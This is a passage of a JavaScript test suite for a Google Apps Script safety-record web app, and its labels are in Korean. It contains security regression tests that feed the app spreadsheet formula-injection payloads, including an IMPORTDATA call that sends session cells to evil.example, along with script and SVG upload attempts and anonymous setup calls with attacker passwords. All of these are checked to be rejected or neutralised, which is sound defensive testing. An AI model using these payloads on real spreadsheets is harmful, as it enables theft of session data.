  denied(api('sites.save', { site: { id: 'S010', name: 'x' } }, S.viewer), ['FORBIDDEN'], 'viewer 사업장 저장');
});

await step('admin.importBulk — id 유지 이관', () => {
  const rec = {
    id: `ID-${SITE3}-261020-01`, form: 'F07', formVersion: 'v2.0', site: SITE3, date: '2026-10-20', period: '2026-10-20', shift: '주간',
    status: '확인', stageDone: [], author: '정이관', rev: 1, createdBy: 'site', requestId: '', createdAt: '2026-10-20T08:40:00',
    updatedAt: '2026-10-20T09:10:00', submittedAt: '2026-10-20T08:55:00', confirmedAt: '2026-10-20T09:10:00', confirmedBy: 'admin',
    data: Object.assign(F07_DATA(), { sec_items: { D01: { r: '양호' } } }), facts: { v: { attend: 12 }, t: {}, k: {}, sm: [] }
  };
  const act = { id: `ACT-${SITE3}-2610-001`, key: rec.id + '#sec_items#D05', site: SITE3, srcId: rec.id, srcForm: 'F07', srcItem: 'D05', title: '비상구 적치물', detail: '', level: '보통', type: '', due: '2026-10-25', owner: '정이관', status: '조치중', history: [], createdAt: '2026-10-20T08:55:00', updatedAt: '2026-10-21T10:00:00' };
  const d = ok(api('admin.importBulk', {
    sites: [{ id: SITE3, name: '여의도파이낸스센터', type: '오피스', region: '서울', client: '대한증권', status: '운영', managerEmail: 's003@site.test', shifts: ['주간'], forms: [], tags: [] }],
    people: [{ id: 'P-imp00001', site: SITE3, name: '정이관', job: '보안', role: '소장', phone4: '0007', active: true }],
    records: [rec], acts: [act], requests: [], reads: []
  }, need(S.hq, '본사 토큰')), 'admin.importBulk');
  assert(d.counts, 'counts 없음');
  const got = ok(api('records.get', { id: rec.id }, S.hq), 'records.get(이관 기록)');
  eq(got.status, '확인', 'status');
  assert(deepEq(got.data, rec.data), '이관 기록 data 가 다릅니다: ' + firstDiff(got.data, rec.data));
  const boot = ok(api('boot', {}, S.hq), 'boot');
  assert(boot.sites.some((s) => s.id === SITE3), 'boot 에 이관 사업장 없음');
  const s3 = boot.sites.find((s) => s.id === SITE3);
  assert(s3.token, '이관 사업장에 토큰이 발급되지 않았습니다');
  return JSON.stringify(d.counts);
});

await step('admin.log — 최신순, 메일 기록 포함', () => {
  const d = ok(api('admin.log', { limit: 200 }, need(S.hq, '본사 토큰')), 'admin.log');
  assert(Array.isArray(d) && d.length > 5, `기록이 너무 적습니다(${d && d.length})`);
  for (let i = 1; i < d.length; i++) assert(String(d[i - 1].at) >= String(d[i].at), '최신순이 아닙니다');
  const m = ok(api('admin.log', { kind: 'mail', limit: 50 }, S.hq), 'admin.log mail');
  assert(Array.isArray(m) && m.length >= 1 && m.every((x) => x.kind === 'mail'), `kind 'mail' 기록이 없습니다`);
  denied(api('admin.log', {}, need(S.site1, '사업장 세션')), ['FORBIDDEN'], '사업장 admin.log');
  return `${d.length}건, 메일 ${m.length}건`;
});

function bigText(n, seed) {
  const words = ['소화기', '비상구', '적치물', '안전모', '점검', '양호', '주의', '불량', '조치', '완료', 'TBM', '근무자', '순찰', '폭염', '휴식'];
  let s = '';
  let i = seed;
  while (s.length < n) { s += words[i % words.length] + ' ' + (i % 97) + '번 '; i = (i * 7 + 3) % 1009; }
  return s.slice(0, n);
}

await step('50,000자 넘는 data 저장·복원(청크)', () => {
  const data = Object.assign(F07_DATA(), { clientNotice: bigText(48000, 1), handoverNote: bigText(47000, 2), workerVoice: bigText(30000, 3) });
  const len = JSON.stringify(data).length;
  const d = ok(api('records.save', { record: { form: 'F07', site: SITE2, date: TODAY, period: TODAY, shift: '야간', author: '본사대리', data } }, need(S.hq, '본사 토큰')), 'records.save(큰 data)');
  const id = d.record.id;
  assert(/H\d+$/.test(id), `본사 대리 입력 ID 는 H1, H2… 로 끝나야 합니다: ${id}`);
  const got = ok(api('records.get', { id }, S.hq), 'records.get');
  assert(deepEq(got.data, data), '복원한 data 가 다릅니다: ' + firstDiff(got.data, data));
  const row = mock.table('records').find((r) => r.id === id);
  assert(row, '시트에 행이 없습니다');
  assert(String(row.data).length <= 50000 && String(row.data_2 || '').length > 0, 'data 가 data_2 … 로 나뉘어 저장되지 않았습니다');
  return `${len.toLocaleString()}자 → data, data_2${row.data_3 ? ', data_3' : ''}${row.data_4 ? ', data_4…' : ''}`;
});

await step('36만 자 넘는 data → 드라이브 저장(@drive:)·복원', () => {
  const data = Object.assign(F07_DATA(), { clientNotice: bigText(140000, 4), handoverNote: bigText(140000, 5), workerVoice: bigText(120000, 6) });
  const d = ok(api('records.save', { record: { form: 'F07', site: SITE2, date: addDays(TODAY, -1), period: addDays(TODAY, -1), shift: '주간', author: '본사대리', data } }, need(S.hq, '본사 토큰')), 'records.save(아주 큰 data)');
  const got = ok(api('records.get', { id: d.record.id }, S.hq), 'records.get');
  assert(deepEq(got.data, data), '복원한 data 가 다릅니다: ' + firstDiff(got.data, data));
  const row = mock.table('records').find((r) => r.id === d.record.id);
  assert(/^@drive:/.test(String(row.data)), `data 열이 @drive:<fileId> 가 아닙니다: ${String(row.data).slice(0, 30)}`);
});

await step('export.sheet (기록 → 새 구글 시트 링크)', () => {
  const d = ok(api('export.sheet', { kind: 'records' }, need(S.hq, '본사 토큰')), 'export.sheet');
  assert(/^https:\/\/docs\.google\.com\/spreadsheets\/d\//.test(d.url), `url 이 구글 시트 링크가 아닙니다: ${d.url}`);
  denied(api('export.sheet', { kind: 'records' }, need(S.site1, '사업장 세션')), ['FORBIDDEN'], '사업장 export');
});

await step('export.xlsx ({name, base64})', () => {
  const d = ok(api('export.xlsx', { kind: 'acts' }, need(S.hq, '본사 토큰')), 'export.xlsx');
  assert(d.name && /\.xlsx$/.test(d.name), 'name 이 .xlsx 가 아닙니다');
  assert(d.base64 && d.base64.length > 100, 'base64 없음');
  const bytes = Buffer.from(d.base64, 'base64');
  assert(bytes[0] === 0x50 && bytes[1] === 0x4b, 'xlsx(zip) 서명 PK 가 아닙니다');
  assert(bytes.includes(Buffer.from('xl/workbook.xml')), 'xlsx 안에 xl/workbook.xml 이 없습니다');
  return `${d.name} · ${bytes.length}바이트`;
});

await step('cronDaily · cronWeekly 실행 오류 없음', () => {
  const before = mails.length;
  exec('cronDaily');
  const w1 = exec('cronWeekly');
  const mid = mails.length;
  const w2 = exec('cronWeekly'); // 같은 날 다시 불러도(google.script.run 으로도 부를 수 있음) 다시 보내지 않음
  eq(mails.length, mid, '같은 날 두 번째 주간 요약 메일 수');
  assert(!w1 || !w1.sent || (w2 && w2.sent === false), '두 번째 주간 요약이 보냄으로 표시됐습니다');
  return `메일 ${mails.length - before}건`;
});

await step('admin.installTriggers / admin.info', () => {
  const d = ok(api('admin.installTriggers', {}, need(S.hq, '본사 토큰')), 'installTriggers');
  const trig = mock.globals.ScriptApp.getProjectTriggers().map((t) => t.getHandlerFunction());
  assert(trig.includes('cronDaily') && trig.includes('cronWeekly'), `트리거가 없습니다: ${trig.join(',')}`);
  ok(api('admin.installTriggers', {}, S.hq), 'installTriggers 두 번째');
  eq(mock.globals.ScriptApp.getProjectTriggers().length, trig.length, '두 번 설치해도 트리거 수');
  const info = ok(api('admin.info', {}, S.hq), 'admin.info');
  assert(info.version, 'version 없음');
  return `트리거 ${trig.join(', ')}`;
});

await step('requests.save — 사업장 메일은 스크립트 잠금을 푼 뒤 발송', () => {
  const G = mock.globals;
  const oLock = G.LockService, oMail = G.MailApp;
  let held = 0;
  const atMail = [];
  G.LockService = Object.assign({}, oLock, { getScriptLock() {
    const l = oLock.getScriptLock(); let mine = false;
    return Object.assign({}, l, {
      waitLock(ms) { l.waitLock(ms); if (!mine) { mine = true; held++; } },
      tryLock(ms) { const r = l.tryLock(ms); if (r && !mine) { mine = true; held++; } return r; },
      releaseLock() { l.releaseLock(); if (mine) { mine = false; held--; } },
      hasLock() { return mine; }
    });
  } });
  G.MailApp = Object.assign({}, oMail, { sendEmail(...a) { atMail.push(held > 0); return oMail.sendEmail(...a); } });
  try {
    const req = { kind: 'form', title: '잠금 시험 요청', forms: ['F01'], sites: ['*'], due: addDays(TODAY, 5) };
    ok(api('requests.save', { request: req }, need(S.hq, '본사 토큰')), 'requests.save');
  } finally {
    G.LockService = oLock; G.MailApp = oMail;
  }
  assert(atMail.length > 0, '요청 메일이 한 통도 나가지 않았습니다');
  assert(atMail.every((x) => !x), `메일 발송 중 잠금 보유: ${JSON.stringify(atMail)}`);
  return `메일 ${atMail.length}통 모두 잠금 밖`;
});

await step('admin.rebuildViews — 끝까지 재구축, 뷰 시트 격자 줄임, push.apply 없음', () => {
  for (const f of files) assert(!/\.push\.apply\(/.test(f.src), `${f.name} 에 push.apply 가 있습니다(큰 배열에서 인자 수 한도로 실패)`);
  const d = ok(api('admin.rebuildViews', {}, need(S.hq, '본사 토큰')), 'rebuildViews');
  eq(d.partial, false, 'partial');
  assert(Array.isArray(d.sheets) && d.sheets.length > 0, '재구축한 시트가 없습니다');
  const sh = mock.globals.SpreadsheetApp.openById(mock.globals.PropertiesService.getScriptProperties().getProperty('DB_ID')).getSheetByName('V_조치대장');
  assert(sh, 'V_조치대장 시트가 없습니다');
  eq(sh.getMaxColumns(), 22, 'V_조치대장 열 수(쓰지 않는 열은 지움)');
  return `시트 ${d.sheets.length}개 · ${d.rows}행`;
});

await step('setup·installTriggers·cron — 익명 웹앱 방문자 호출은 막힘(소유자 실행만)', () => {
  // 웹앱은 '배포자로 실행' — effective 는 소유자, active 는 익명 방문자면 빈 값·편집기 실행이면 소유자(모의는 opts 를 호출 때마다 읽음)
  const ident = { autoSave: false, formsHtml, htmlFiles: htmlFileNames(SRC_DIR), log: sink, activeUserEmail: '', effectiveUserEmail: 'owner@hds.test' };
  const c3 = vm.createContext({ console: sink });
  vm.runInContext(mockSrc, c3, { filename: 'gas-mock.js' });
  const m3 = c3.createGasMock(ident);
  Object.assign(c3, m3.globals);
  for (const f of files) vm.runInContext(f.src, c3, { filename: f.name });
  const props = m3.globals.PropertiesService.getScriptProperties();
  let threw = false;
  try { c3.setup({ adminPassword: 'Attacker1234' }); } catch (e) { threw = true; }
  assert(threw, '설치 전 익명 setup 이 거부되지 않았습니다');
  assert(!props.getProperty('DB_ID'), '익명 setup 이 DB 를 만들었습니다');
  ident.activeUserEmail = 'owner@hds.test';
  const r0 = c3.setup({ adminPassword: 'owner-pw-1', triggers: false });
  assert(r0.dbUrl, '소유자 setup 이 동작하지 않았습니다');
  ident.activeUserEmail = '';
  const logN = () => m3.table('log').length;
  const n0 = logN();
  const r1 = c3.setup({ adminPassword: 'Hacker123' });
  assert(r1 && r1.already === true && !r1.dbUrl && !r1.folderUrl, `설치 후 익명 setup 반환이 정보를 내보냅니다: ${JSON.stringify(r1)}`);
  eq(JSON.stringify(c3.installTriggers()), '{"already":true}', '익명 installTriggers');
  eq(JSON.stringify(c3.ensureSchema()), '{"already":true}', '익명 ensureSchema');
  eq(c3.cronDaily(), undefined, '익명 cronDaily 반환');
  eq(c3.cronWeekly(), undefined, '익명 cronWeekly 반환');
  eq(logN(), n0, '익명 호출 뒤 로그 행 수');
  eq(m3.globals.ScriptApp.getProjectTriggers().length, 0, '익명 호출 뒤 트리거 수');
  const login = JSON.parse(c3.api('auth.login', JSON.stringify({ id: 'admin', password: 'Hacker123' }), ''));
  eq(login.ok, false, '공격자 비밀번호 로그인');
  return '익명 setup 거부 · 설치 후 {already:true}';
});

/* ---------------- 감사 지적 회귀 시험(보안·무결성) ---------------- */
const FORMULA_LEAD = /^[=+\-@\t\r\n]/;
function badCells(names, bookId) {
  const out = [];
  for (const n of names) {
    for (const row of mock.table(n, bookId)) {
      for (const [k, v] of Object.entries(row)) if (typeof v === 'string' && FORMULA_LEAD.test(v)) out.push(`${n}.${k}=${v.slice(0, 30)}`);
    }
  }
  return out;
}
const b64 = (s) => Buffer.from(s, 'utf8').toString('base64');
const yes = (v) => v === true || v === 'true' || v === 'Y';

await step('(보안) 숫자·날짜·시각 칸에 글자 → INVALID, 빈 기록 제출 → INVALID', () => {
  const site = need(S.site1, '사업장 세션');
  const base = { form: 'F07', site: SITE1, date: addDays(TODAY, -3), period: addDays(TODAY, -3), shift: '주간', author: '김현장' };
  const evil = '+IMPORTDATA("https://evil.example/?x="&JOIN(",",sessions!A2:A9))';
  const r1 = denied(api('records.submit', { record: Object.assign({}, base, { data: Object.assign(F07_DATA(), { attend: evil }) }), acts: [] }, site), ['INVALID'], '숫자 칸에 수식 글자');
  assert(/숫자/.test(r1.error), '오류 문장에 숫자 안내가 없습니다: ' + r1.error);
  denied(api('records.save', { record: Object.assign({}, base, { data: Object.assign(F07_DATA(), { checkTime: '+users!F2' }) }) }, site), ['INVALID'], '시각 칸에 수식 글자(임시저장)');
  denied(api('records.submit', { record: Object.assign({}, base, { data: {} }), acts: [] }, site), ['INVALID'], '빈 data 제출');
  return '거부 확인';
});

await step('(보안) 글자 칸의 +,-,@,= 값은 V_ 시트·재구축·내보내기에서 글자로(수식 아님)', () => {
  const site = need(S.site1, '사업장 세션');
  const rec = { form: 'F07', site: SITE1, date: addDays(TODAY, -3), period: addDays(TODAY, -3), shift: '주간', author: '-김현장',
    data: Object.assign(F07_DATA(), { handoverNote: '+IMPORTXML("https://evil.example","//a")', workerVoice: '@SUM(1)', tbmTopic: '=1+1', heatPlace: '-users!F2' }) };
  const d = ok(api('records.submit', { record: rec, acts: [] }, site), 'records.submit(수식 글자)');
  S.evilRec = d.record.id;
  const vNames = mock.sheetNames().filter((n) => /^V_/.test(n));
  assert(vNames.length, 'V_ 시트가 없습니다');
  let bad = badCells(vNames);
  assert(!bad.length, '제출 직후 V_ 시트에 수식으로 읽힐 칸: ' + bad.slice(0, 4).join(' | '));
  // 숫자·날짜 열에 들어간 글자도(이관 등 검사 밖 경로) 따옴표로 글자 처리되는지 — 재구축으로 확인
  const imp = Object.assign({}, rec, { id: `ID-${SITE1}-${YYMMDD}-90`, status: '제출', rev: 1, stageDone: [], createdBy: 'site', submittedAt: '+1+1', createdAt: TODAY + 'T08:00:00', updatedAt: TODAY + 'T08:00:00',
    data: Object.assign(F07_DATA(), { attend: '-1+users!F2', healthChecked: '+sessions!A2' }), facts: {} });
  ok(api('admin.importBulk', { records: [imp] }, need(S.hq, '본사 토큰')), 'importBulk(검사 밖 값)');
  ok(api('admin.rebuildViews', {}, S.hq), 'rebuildViews');
  bad = badCells(mock.sheetNames().filter((n) => /^V_/.test(n)));
  assert(!bad.length, '재구축 뒤 V_ 시트에 수식으로 읽힐 칸: ' + bad.slice(0, 4).join(' | '));
  const ex = ok(api('export.sheet', { kind: 'form', form: 'F07' }, S.hq), 'export.sheet(form)');
  const bookId = /\/d\/([^/]+)/.exec(ex.url)[1];
  bad = badCells(mock.sheetNames(bookId), bookId);
  assert(!bad.length, '내보내기 시트에 수식으로 읽힐 칸: ' + bad.slice(0, 4).join(' | '));
  ok(api('records.delete', { id: imp.id, reason: '시험 정리' }, S.hq), '정리');
  return `V_ 시트 ${vNames.length}개 · 내보내기 시트 ${mock.sheetNames(bookId).length}개`;
});

await step('(권한) F10 본사 전용 단계 — 사업장은 제출·덮어쓰기 불가, 비공개 칸은 읽기에서 빠짐', () => {
  const site = need(S.site1, '사업장 세션'), hq = need(S.hq, '본사 토큰');
  const base = { form: 'F10', site: SITE1, date: TODAY, period: '', author: '김현장' };
  const s1 = ok(api('records.submit', { record: Object.assign({}, base, { data: validData('F10', {}, 0) }), stageId: 's1', acts: [] }, site), 'F10 s1');
  const id = s1.record.id;
  const sneak = { d30Status: '같은 사업장 근무 중', d30By: '김현장', closeNote: '사업장이 쓴 종결 의견', raNeed: '아니오', naReason: '불필요' };
  ok(api('records.submit', { record: { id, data: validData('F10', sneak, 1) }, stageId: 's2', acts: [] }, site), 'F10 s2(본사 칸 끼워 넣기)');
  let h = ok(api('records.get', { id }, hq), 'records.get(본사)');
  for (const k of Object.keys(sneak)) assert(h.data[k] === undefined, `사업장이 끼워 넣은 본사 칸 ${k} 가 저장됐습니다`);
  denied(api('records.submit', { record: { id, data: h.data }, stageId: 's3', acts: [] }, site), ['FORBIDDEN'], '사업장 s3 제출');
  // 본사가 s3·s4 를 끝낸다
  const hqData = Object.assign(validData('F10', {}, 3), h.data, { raNeed: '예', naReason: '', hqOpinion: '본사 내부 의견', d30Method: '본사 대면 면담', d30By: '박본사', d30Status: '회사 사정으로 이동', closeNote: '본사 내부 메모' });
  const facts = { v: { swType: hqData.swType, raNeed: '예', d30Method: '본사 대면 면담' }, t: { sec_measures: { n: 1 } }, k: { sec_d30check: { A1: '양호' } }, sm: [] };
  ok(api('records.submit', { record: { id, data: hqData, facts }, stageId: 's3', acts: [] }, hq), 'F10 s3(본사)');
  const fin = ok(api('records.submit', { record: { id, data: hqData, facts }, stageId: 's4', acts: [] }, hq), 'F10 s4(본사)');
  eq(fin.record.status, '제출', '본사 s4 뒤 status');
  // 사업장 읽기: 비공개 칸 없음(기록·색인 facts 모두)
  const sg = ok(api('records.get', { id }, site), 'records.get(사업장)');
  for (const k of ['d30Status', 'd30By', 'd30Method', 'closeNote', 'naReason', 'hqOpinion', 'sec_d30check', 'sec_measures']) assert(!(k in sg.data), `사업장 records.get 에 비공개 칸 ${k} 가 보입니다`);
  const bg = ok(api('records.bulkGet', { ids: [id] }, site), 'records.bulkGet(사업장)');
  assert(!('d30Status' in bg[0].data), '사업장 bulkGet 에 d30Status 가 보입니다');
  const row = ok(api('boot', {}, site), 'boot(사업장)').index.find((x) => x.id === id);
  assert(row && !('d30Method' in (row.facts.v || {})) && !('sec_d30check' in (row.facts.k || {})) && !('sec_measures' in (row.facts.t || {})), '사업장 색인 facts 에 비공개 값이 보입니다: ' + JSON.stringify(row && row.facts));
  // 사업장 재제출: 끝난 본사 단계 → 거부, s1 수정 보고 → 본사 칸은 그대로
  denied(api('records.submit', { record: { id, data: Object.assign({}, sg.data, { d30Status: '같은 사업장 근무 중' }) }, stageId: 's4', acts: [] }, site), ['FORBIDDEN'], '사업장이 끝난 s4 재제출');
  ok(api('records.submit', { record: { id, data: Object.assign({}, sg.data, { d30Status: '같은 사업장 근무 중', closeNote: '' }), facts: { v: { swType: hqData.swType } } }, stageId: 's1', acts: [] }, site), '사업장 s1 수정 보고');
  h = ok(api('records.get', { id }, hq), 'records.get(본사, 뒤)');
  eq(h.data.d30Status, '회사 사정으로 이동', 'd30Status(본사 값 유지)');
  eq(h.data.closeNote, '본사 내부 메모', 'closeNote(본사 값 유지)');
  eq(h.facts.v.d30Method, '본사 대면 면담', 'facts.v.d30Method(본사 값 유지)');
  assert(h.facts.k && h.facts.k.sec_d30check, 'facts.k.sec_d30check 가 사라졌습니다');
  S.f10 = id;
  return id;
});

await step('(인증) 잠금 키 분리 — 본사 로그인 폼으로 사업장 PIN·비밀번호 변경을 잠글 수 없음', () => {
  const hq = need(S.hq, '본사 토큰');
  ok(api('sites.setPin', { id: SITE2, pin: '4321' }, hq), 'setPin S002');
  for (let i = 0; i < 6; i++) denied(api('auth.login', { id: 'site:' + SITE2.toLowerCase(), password: 'x' }), ['AUTH'], '본사 폼에 site:S002');
  for (let i = 0; i < 6; i++) denied(api('auth.login', { id: 'pw:admin', password: 'x' }), ['AUTH'], '본사 폼에 pw:admin');
  const d = ok(api('auth.siteLogin', { siteToken: need(S.tok2, 'S002 토큰'), pin: '4321', name: '최판교' }), '정상 PIN 로그인');
  assert(d.token, '토큰 없음');
  const r = denied(api('auth.changePassword', { old: 'not-the-pw-1', new: 'Another123' }, hq), ['INVALID', 'AUTH'], '틀린 지금 비밀번호');
  assert(!/잠겼/.test(r.error), '비밀번호 변경이 남이 만든 실패 횟수로 잠겼습니다: ' + r.error);
  // 본사 아이디 잠금은 그대로 동작
  for (let i = 0; i < 5; i++) denied(api('auth.login', { id: 'viewer1', password: 'nope' }), ['AUTH'], '틀린 비번');
  const lk = denied(api('auth.login', { id: 'viewer1', password: 'view1234a' }), ['AUTH'], '잠긴 아이디');
  assert(/잠겼/.test(lk.error), '5회 실패 뒤 잠기지 않았습니다: ' + lk.error);
  ok(api('sites.setPin', { id: SITE2, pin: '' }, hq), 'PIN 해제');
});

await step('(조치) 수정 제출로 양호가 된 항목의 자동 조치 정리(등록=삭제, 진행 중=이력 안내)', () => {
  const site = need(S.site1, '사업장 세션');
  const date = addDays(TODAY, -4);
  const data = F07_DATA();
  data.sec_items = Object.assign({}, data.sec_items, { D05: { r: '불량', note: '비상구 적치물' }, D06: { r: '주의', note: '조명 깜빡임' } });
  const s1 = ok(api('records.save', { record: { form: 'F07', site: SITE1, date, period: date, shift: '주간', author: '김현장', data } }, site), 'save');
  const id = s1.record.id;
  const cands = ['D05', 'D06'].map((c) => ({ key: `${id}#sec_items#${c}`, srcItem: c, title: c + ' 개선', detail: '', level: c === 'D05' ? '높음' : '보통', due: '', owner: '', photo: null }));
  const d1 = ok(api('records.submit', { record: { id, data }, acts: cands }, site), '제출(조치 2건)');
  eq(d1.acts.length, 2, '자동 조치 수');
  const a5 = d1.acts.find((a) => a.srcItem === 'D05'), a6 = d1.acts.find((a) => a.srcItem === 'D06');
  ok(api('acts.transition', { id: a6.id, to: '조치중', note: '교체 주문' }, site), 'D06 조치중');
  const fixed = F07_DATA();
  const d2 = ok(api('records.submit', { record: { id, data: fixed }, acts: [] }, site), '수정 제출(모두 양호)');
  eq(Number(d2.record.rev), 2, 'rev');
  const t5 = mock.table('acts').find((a) => a.id === a5.id), t6 = mock.table('acts').find((a) => a.id === a6.id);
  assert(yes(t5.deleted), '손대지 않은 D05 조치가 삭제되지 않았습니다');
  assert(/자동 정리/.test(String(t5.history)), 'D05 이력에 정리 사유가 없습니다');
  assert(!yes(t6.deleted) && t6.status === '조치중', '진행 중인 D06 조치는 남아야 합니다');
  assert(/조치 대상이 아님/.test(String(t6.history)), 'D06 이력에 안내가 없습니다');
  assert(Array.isArray(d2.prunedActs) && d2.prunedActs.some((a) => a.id === a5.id && a.deleted), '응답 prunedActs 에 정리된 조치가 없습니다');
  ok(api('records.submit', { record: { id, data: fixed }, acts: [] }, site), '한 번 더 수정 제출');
  const t6b = mock.table('acts').find((a) => a.id === a6.id);
  eq((String(t6b.history).match(/조치 대상이 아님/g) || []).length, 1, 'D06 안내 이력은 한 번만');
  return `${a5.id} 삭제 · ${a6.id} 유지`;
});

await step('(파일) files.put 허용 목록 — html·exe·내용 불일치·깨진 base64 거부', () => {
  const site = need(S.site1, '사업장 세션');
  const put = (dataUrl, name, kind) => api('files.put', { dataUrl, name, kind: kind || 'attach' }, site);
  denied(put('data:text/html ;base64,' + b64('<script>1</script>'), 'a'), ['INVALID'], 'text/html(공백)');
  denied(put('data:image/png;base64,' + PNG_1PX, '점검표.html'), ['INVALID'], '.html 이름');
  denied(put('data:image/png;base64,' + PNG_1PX, 'setup.exe'), ['INVALID'], '.exe 이름');
  denied(put('data:image/svg+xml;base64,' + b64('<svg onload="x"/>'), 'a.svg'), ['INVALID'], 'svg');
  denied(put('data:image/png;base64,' + b64('<html><script>1</script></html>'), '사진.png', 'photo'), ['INVALID'], 'png 이름에 HTML 내용');
  denied(put('data:application/pdf;base64,' + PNG_1PX, '보고서.pdf'), ['INVALID'], 'pdf 이름에 png 내용');
  const bad = denied(put('data:image/png;base64,!!!!', 'x.png', 'photo'), ['INVALID'], '깨진 base64');
  assert(!/decode/i.test(bad.error), '서버 예외 문장이 그대로 나갑니다: ' + bad.error);
  const pdf = ok(put('data:application/pdf;base64,' + b64('%PDF-1.4\n%%EOF\n'), '보고서.pdf'), 'pdf');
  eq(pdf.file.mime, 'application/pdf', 'pdf mime');
  const ole = Buffer.from([0xd0, 0xcf, 0x11, 0xe0, 0xa1, 0xb1, 0x1a, 0xe1, 0, 0, 0, 0]).toString('base64');
  const hwp = ok(put('data:application/octet-stream;base64,' + ole, '안전교육.hwp'), 'hwp(octet-stream)');
  eq(hwp.file.name, '안전교육.hwp', 'hwp 이름');
  const sign = ok(put('data:image/png;base64,' + PNG_1PX, '서명-소장', 'sign'), '확장자 없는 서명');
  eq(sign.file.name, '서명-소장.png', '확장자 붙임');
  return 'pdf·hwp·png 통과, 나머지 거부';
});

await step('(범위) 사업장 boot 의 요청 — 다른 사업장·독촉 이력·본사 담당자 이름 숨김', () => {
  const hq = need(S.hq, '본사 토큰');
  const req = ok(api('requests.save', { request: { kind: 'form', title: '3곳 대상 요청', message: '제출해 주세요', forms: ['F09'], sites: [SITE1, SITE2, SITE3], due: addDays(TODAY, 5) } }, hq), 'requests.save').request;
  ok(api('requests.remind', { id: req.id }, hq), 'remind');
  const all = ok(api('requests.save', { request: { kind: 'notice', title: '전체 공지', message: '공지', sites: ['*'] } }, hq), '전체 공지').request;
  ok(api('requests.remind', { id: all.id }, hq), 'remind 전체');
  const b = ok(api('boot', {}, need(S.site1, '사업장 세션')), 'boot(사업장)');
  for (const r of b.requests) {
    assert(deepEq(r.sites, ['*']) || deepEq(r.sites, [SITE1]), `요청 ${r.id} sites 에 다른 사업장이 보입니다: ${JSON.stringify(r.sites)}`);
    const sent = (r.remind && r.remind.sent) || {};
    assert(Object.keys(sent).every((k) => k === SITE1), `요청 ${r.id} 독촉 이력에 다른 사업장: ${JSON.stringify(sent)}`);
    eq(r.createdBy, '본사', '요청 작성자');
  }
  assert(b.requests.some((r) => r.id === req.id), '3곳 대상 요청이 사업장에 안 보입니다');
  const hb = ok(api('boot', {}, hq), 'boot(본사)').requests.find((r) => r.id === req.id);
  eq(hb.sites.length, 3, '본사에는 대상 사업장 3곳 그대로');
  S.req3 = req;
});

await step('(남용) 사업장 세션·열람 표시·인원 상한, viewer 열람 표시 거부', () => {
  for (let i = 0; i < 12; i++) ok(api('auth.siteLogin', { siteToken: need(S.tok1, '사업장 토큰'), name: '반복로그인' }), 'siteLogin');
  const n = mock.table('sessions').filter((r) => r.site === SITE1 && r.name === '반복로그인').length;
  assert(n <= 5, `같은 이름 세션이 ${n}개 남았습니다(최대 5)`);
  ok(api('boot', {}, need(S.site1, '사업장 세션')), '다른 이름 세션은 그대로');
  const before = mock.table('reads').length;
  for (let i = 0; i < 5; i++) denied(api('reads.mark', { refId: 'junk-' + i }, S.site1), ['NOTFOUND'], '없는 대상 열람 표시');
  denied(api('reads.mark', { refId: 'ID-NOPE-000000-01#s1' }, S.hq), ['NOTFOUND'], '없는 기록 단계 확인 표시');
  eq(mock.table('reads').length, before, 'reads 행 수');
  const v = ok(api('auth.login', { id: 'admin', password: PW }), '관리자 로그인');
  ok(api('users.save', { user: { id: 'viewer2', name: '열람2', role: 'viewer', email: 'v2@hds.test', active: true }, password: 'view2345a' }, v.token), 'viewer2');
  const vt = ok(api('auth.login', { id: 'viewer2', password: 'view2345a' }), 'viewer2 로그인').token;
  denied(api('reads.mark', { refId: need(S.req, '요청').id }, vt), ['FORBIDDEN'], 'viewer 열람 표시');
  const rows = Array.from({ length: 1001 }, (x, i) => ({ name: '인원' + i }));
  denied(api('people.bulk', { site: SITE1, rows }, S.site1), ['INVALID'], '1,001명 한 번에');
  return `같은 이름 세션 ${n}개`;
});

await step('(삭제) 반려된 단계 보고(F04 속보)는 사업장이 지울 수 없음', () => {
  const site = need(S.site1, '사업장 세션');
  const d = ok(api('records.submit', { record: { form: 'F04', site: SITE1, date: TODAY, period: '', author: '김현장', data: validData('F04', {}, 0) }, stageId: 's1', acts: [] }, site), 'F04 s1');
  ok(api('records.review', { id: d.record.id, decision: '반려', note: '피해 정도를 다시 적어 주세요' }, need(S.hq, '본사 토큰')), '반려');
  denied(api('records.delete', { id: d.record.id, reason: '' }, site), ['FORBIDDEN'], '반려된 단계 보고 삭제');
  const left = mock.table('records').find((r) => r.id === d.record.id);
  assert(!yes(left.deleted), '기록이 지워졌습니다');
});

await step('(제출 시각) 반려 뒤 다시 제출하면 submittedAt 갱신, 이전 시각은 감사 기록에', () => {
  const hq = need(S.hq, '본사 토큰');
  const id = `ID-${SITE1}-261019-01`;
  const old = '2026-10-20T07:16:00';
  ok(api('admin.importBulk', { records: [{ id, form: 'F07', formVersion: 'v2.0', site: SITE1, date: '2026-10-19', period: '2026-10-19', shift: '주간', status: '반려', stageDone: [], author: '김현장', rev: 1, createdBy: 'site', requestId: '',
    createdAt: old, updatedAt: '2026-10-20T17:15:00', submittedAt: old, returnedAt: '2026-10-20T17:15:00', returnedBy: '본사', returnNote: '사진 첨부', data: F07_DATA(), facts: {} }] }, hq), 'importBulk(반려 기록)');
  const d = ok(api('records.submit', { record: { id, data: F07_DATA() }, acts: [] }, need(S.site1, '사업장 세션')), '다시 제출');
  assert(d.record.submittedAt > '2026-10-20T17:15:00', `submittedAt 이 갱신되지 않았습니다: ${d.record.submittedAt}`);
  const lg = ok(api('admin.log', { kind: 'submit', limit: 20 }, hq), 'admin.log');
  assert(lg.some((x) => x.ref === id && /이전 제출 2026-10-20 07:16/.test(x.text)), '감사 기록에 이전 제출 시각이 없습니다');
});

await step('(조치) 사업장은 기한·위험 수준을 못 바꾸고, 본사 변경은 이력에 전후 값', () => {
  const site = need(S.site1, '사업장 세션'), hq = need(S.hq, '본사 토큰');
  const a = ok(api('acts.save', { act: { site: SITE1, title: '난간 보수', level: '높음', due: addDays(TODAY, -1) } }, hq), '본사 등록').act;
  denied(api('acts.transition', { id: a.id, to: '보류', note: '자재 대기', due: '2027-12-31' }, site), ['FORBIDDEN'], '사업장 전이로 기한 연장');
  denied(api('acts.save', { act: { id: a.id, level: '낮음' } }, site), ['FORBIDDEN'], '사업장 수준 낮춤');
  denied(api('acts.save', { act: { id: a.id, due: '2027-12-31' } }, site), ['FORBIDDEN'], '사업장 기한 연장');
  ok(api('acts.transition', { id: a.id, to: '조치중', note: '착수' }, site), '사업장 일반 전이는 허용');
  const t = ok(api('acts.transition', { id: a.id, to: '보류', note: '자재 대기', due: addDays(TODAY, 10) }, hq), '본사 기한 변경').act;
